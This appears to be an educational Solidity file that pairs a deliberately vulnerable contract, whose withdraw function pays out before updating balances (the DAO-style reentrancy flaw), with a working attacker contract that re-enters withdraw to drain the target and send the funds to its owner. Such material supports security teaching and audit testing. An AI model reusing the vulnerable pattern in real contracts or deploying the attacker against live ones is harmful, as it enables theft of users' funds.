// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Reentrancy — VULNERABLE (For Security Research Only)
 * @notice Demonstrates the classic reentrancy vulnerability.
 *         Modeled after The DAO hack (2016) — $60M exploited.
 * @dev DO NOT DEPLOY TO MAINNET. Educational and audit testing purposes only.
 */
contract Reentrancy {
    mapping(address => uint256) public balances;

    event Deposited(address indexed user, uint256 amount);
    event Withdrawn(address indexed user, uint256 amount);

    function deposit() external payable {
        require(msg.value > 0, "Must deposit > 0");
        balances[msg.sender] += msg.value;
        emit Deposited(msg.sender, msg.value);
    }

    /**
     * @notice VULNERABLE: External call before state update.
     *         An attacker contract can re-enter this function
     *         before balances[msg.sender] is set to 0.
     */
    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // ❌ VULNERABILITY: State not updated before external call
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] -= amount; // Too late — attacker already drained
        emit Withdrawn(msg.sender, amount);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}


/**
 * @title ReentrancyAttacker
 * @notice Attack contract that exploits the reentrancy vulnerability.
 */
contract ReentrancyAttacker {
    Reentrancy public target;
    address public owner;
    uint256 public attackAmount;

    constructor(address _target) {
        target = Reentrancy(_target);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        attackAmount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }

    // Called repeatedly during reentrancy
    receive() external payable {
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }

    function drain() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
